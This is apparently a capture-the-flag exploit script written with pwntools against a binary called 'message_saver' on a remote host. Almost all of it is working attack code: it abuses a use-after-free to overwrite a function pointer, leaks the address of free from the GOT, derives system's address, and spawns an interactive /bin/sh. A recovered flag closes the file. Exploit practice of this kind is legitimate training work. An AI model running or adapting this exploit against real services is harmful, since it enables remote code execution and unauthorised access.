#!/usr/bin/env python

from pwn import *

context.log_level = "debug"


context.terminal=['gnome-terminal', '-x', 'bash', '-c']

local = 0
if local:
	p = process('./message_saver')
	elf = ELF('./message_saver')
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
	p = remote('111.230.149.72', 10011)
	elf = ELF('./message_saver')
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')


free_got = elf.got['free']
sub_read = 0x40084d	#getstring
system_off = libc.symbols['system']
free_off = libc.symbols['free']


def add(length, message):
    p.recvuntil("> ")
    p.sendline("1")
    p.recvuntil("input message length:\n")
    p.sendline(str(length))
    p.recvuntil("input message:\n")
    p.send(message)
    p.recvuntil("====================\n")
    p.sendline("1")

def edit(length, message):
    p.recvuntil("> ")
    p.sendline("2")
    p.recvuntil("input message length:\n")
    p.sendline(str(length))
    p.recvuntil("input message:\n")
    p.send(message)

def put():
    p.recvuntil("> ")
    p.sendline("3")

def delete():
    p.recvuntil("> ")
    p.sendline("4")

#part one
add(0x10, "\n")
delete()
payload = p8(0)*0x10
payload += p64(sub_read)
edit(0x18, payload)
payload = p64(0)+p64(free_got)
p.sendline(payload)
put()

#part two
free_addr = u64(p.recv(6).ljust(8, "\x00"))
system_addr = free_addr - (libc.symbols['free'] - libc.symbols['system'])
delete()
payload = "/bin/sh\x00"
payload += p64(0)+p64(system_addr)
edit(0x18, payload)
p.interactive()


#hgame{be_careful_wtih_dangling_pointers}
